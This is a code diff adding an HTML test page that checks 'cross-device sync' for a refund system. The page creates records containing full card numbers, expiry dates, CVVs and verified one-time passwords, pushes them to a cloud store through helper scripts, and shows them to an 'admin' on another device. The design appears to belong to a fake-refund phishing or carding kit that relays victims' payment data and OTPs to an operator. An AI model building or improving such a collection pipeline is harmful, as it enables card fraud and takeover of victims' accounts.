@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Cross-Device Sync</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 20px auto; padding: 20px; }
+        .test-section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
+        button { padding: 10px 15px; margin: 5px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        .success { background: #d4edda; color: #155724; padding: 10px; border-radius: 3px; margin: 10px 0; }
+        .error { background: #f8d7da; color: #721c24; padding: 10px; border-radius: 3px; margin: 10px 0; }
+        .info { background: #d1ecf1; color: #0c5460; padding: 10px; border-radius: 3px; margin: 10px 0; }
+        pre { background: #f8f9fa; padding: 10px; border-radius: 3px; overflow-x: auto; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <h1>🔄 Cross-Device Sync Test</h1>
+    
+    <div class="info">
+        <strong>Purpose:</strong> This page tests if data from user devices reaches admin on different devices.
+    </div>
+
+    <div class="test-section">
+        <h3>Step 1: Add Test Data (Simulate User)</h3>
+        <button onclick="addTestRefund()">➕ Add Test Refund</button>
+        <button onclick="addTestOTP()">🔑 Add Test OTP</button>
+        <div id="addResult"></div>
+    </div>
+
+    <div class="test-section">
+        <h3>Step 2: Sync to Cloud</h3>
+        <button onclick="syncToCloud()">☁️ Sync to Cloud</button>
+        <div id="syncResult"></div>
+    </div>
+
+    <div class="test-section">
+        <h3>Step 3: Load from Cloud (Simulate Admin on Different Device)</h3>
+        <button onclick="loadFromCloud()">📥 Load from Cloud</button>
+        <div id="loadResult"></div>
+    </div>
+
+    <div class="test-section">
+        <h3>Step 4: View All Data</h3>
+        <button onclick="viewAllData()">👀 View All Data</button>
+        <div id="viewResult"></div>
+    </div>
+
+    <div class="test-section">
+        <h3>Step 5: Clear All Data</h3>
+        <button onclick="clearAllData()" style="background: #dc3545;">🗑️ Clear All Data</button>
+        <div id="clearResult"></div>
+    </div>
+
+    <script src="data-sync.js"></script>
+    <script src="cross-device-fix.js"></script>
+    <script>
+        function addTestRefund() {
+            const testRefund = {
+                id: 'TEST_REF_' + Date.now(),
+                cardholderName: 'Test User ' + Math.floor(Math.random() * 100),
+                cardNumber: '1234 5678 9012 3456',
+                expiryDate: '12/25',
+                cvv: '123',
+                description: 'Test refund from cross-device test',
+                timestamp: new Date().toISOString(),
+                status: 'pending'
+            };
+
+            let refunds = JSON.parse(localStorage.getItem('refunds')) || [];
+            refunds.push(testRefund);
+            
+            if (typeof saveWithCrossDeviceSync === 'function') {
+                saveWithCrossDeviceSync('refunds', refunds);
+            } else {
+                localStorage.setItem('refunds', JSON.stringify(refunds));
+            }
+
+            document.getElementById('addResult').innerHTML = `
+                <div class="success">✅ Test refund added: ${testRefund.id}</div>
+            `;
+        }
+
+        function addTestOTP() {
+            const testOTP = {
+                otp: Math.floor(100000 + Math.random() * 900000).toString(),
+                refundId: 'TEST_REF_' + Date.now(),
+                timestamp: new Date().toISOString(),
+                type: 'refund',
+                status: 'verified'
+            };
+
+            let otps = JSON.parse(localStorage.getItem('refundOtps')) || [];
+            otps.push(testOTP);
+            
+            if (typeof saveWithCrossDeviceSync === 'function') {
+                saveWithCrossDeviceSync('refundOtps', otps);
+            } else {
+                localStorage.setItem('refundOtps', JSON.stringify(otps));
+            }
+
+            document.getElementById('addResult').innerHTML = `
+                <div class="success">✅ Test OTP added: ${testOTP.otp}</div>
+            `;
+        }
+
+        async function syncToCloud() {
+            const resultDiv = document.getElementById('syncResult');
+            resultDiv.innerHTML = '<div class="info">🔄 Syncing to cloud...</div>';
+
+            try {
+                let success = false;
+                
+                if (typeof forceCrossDeviceSync === 'function') {
+                    success = await forceCrossDeviceSync();
+                }
+
+                if (success) {
+                    resultDiv.innerHTML = '<div class="success">✅ Data synced to cloud successfully!</div>';
+                } else {
+                    resultDiv.innerHTML = '<div class="error">❌ Cloud sync failed. Check console for details.</div>';
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="error">❌ Sync error: ${error.message}</div>`;
+            }
+        }
+
+        async function loadFromCloud() {
+            const resultDiv = document.getElementById('loadResult');
+            resultDiv.innerHTML = '<div class="info">📥 Loading from cloud...</div>';
+
+            try {
+                let success = false;
+                
+                if (typeof loadCrossDeviceData === 'function') {
+                    success = await loadCrossDeviceData();
+                }
+
+                if (success) {
+                    const refunds = JSON.parse(localStorage.getItem('refunds')) || [];
+                    const otps = JSON.parse(localStorage.getItem('refundOtps')) || [];
+                    
+                    resultDiv.innerHTML = `
+                        <div class="success">
+                            ✅ Data loaded from cloud successfully!<br>
+                            Refunds: ${refunds.length}<br>
+                            OTPs: ${otps.length}
+                        </div>
+                    `;
+                } else {
+                    resultDiv.innerHTML = '<div class="error">❌ No data found in cloud or load failed.</div>';
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="error">❌ Load error: ${error.message}</div>`;
+            }
+        }
+
+        function viewAllData() {
+            const refunds = JSON.parse(localStorage.getItem('refunds')) || [];
+            const otps = JSON.parse(localStorage.getItem('refundOtps')) || [];
+            const orders = JSON.parse(localStorage.getItem('orders')) || [];
+
+            document.getElementById('viewResult').innerHTML = `
+                <div class="info">
+                    <strong>Current Data:</strong><br>
+                    Refunds: ${refunds.length}<br>
+                    OTPs: ${otps.length}<br>
+                    Orders: ${orders.length}<br><br>
+                    <strong>Refunds Data:</strong>
+                    <pre>${JSON.stringify(refunds, null, 2)}</pre>
+                    <strong>OTPs Data:</strong>
+                    <pre>${JSON.stringify(otps, null, 2)}</pre>
+                </div>
+            `;
+        }
+
+        function clearAllData() {
+            localStorage.removeItem('refunds');
+            localStorage.removeItem('refundOtps');
+            localStorage.removeItem('orders');
+            localStorage.removeItem('otps');
+            localStorage.removeItem('payments');
+
+            document.getElementById('clearResult').innerHTML = `
+                <div class="success">✅ All data cleared from local storage</div>
+            `;
+        }
+
+        // Auto-load data on page load
+        window.addEventListener('load', () => {
+            setTimeout(viewAllData, 1000);
+        });
+    </script>
+</body>
+</html>
